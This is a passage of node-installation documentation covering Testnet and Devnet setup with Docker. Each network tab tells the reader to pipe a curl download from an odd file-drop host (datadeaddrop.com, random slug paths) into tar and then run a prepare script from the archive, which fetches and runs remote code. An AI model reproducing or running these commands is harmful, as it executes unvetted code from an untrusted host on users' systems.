...
In a new directory for your node install, e.g.:
```shell
...
<Tabs groupId="network" queryString>
    <TabItem label="Testnet" value="testnet">
        ```shell
        curl -sL https://datadeaddrop.com/download/phaeton-evocable-sideburn | tar -xf - --strip-components=1
        ./prepare_testnet.sh
        ```
    </TabItem>
    ...
    <TabItem label="Devnet" value="devnet">
        ```shell
        curl -sL https://datadeaddrop.com/download/bulge-elude-methink | tar -xf - --strip-components=1
        ./prepare_devnet.sh
        ```
    </TabItem>
</Tabs>

The installer will perform the following steps by default:
- create a `data` directory
- copy a template configuration to `data/config/fullnode.yaml`.  
    You can modify this file to configure your node.
- download the necessary `genesis.blob` for your network, and, if needed, `migration.blob`

## Start Your Full Node

In the `./docker` directory inside your install directory, start your node by running:  
```shell
docker compose up -d
```
...
By default, the configuration file `fullnode.yaml` is located at `<your-docker-install-path>/data/config/`.
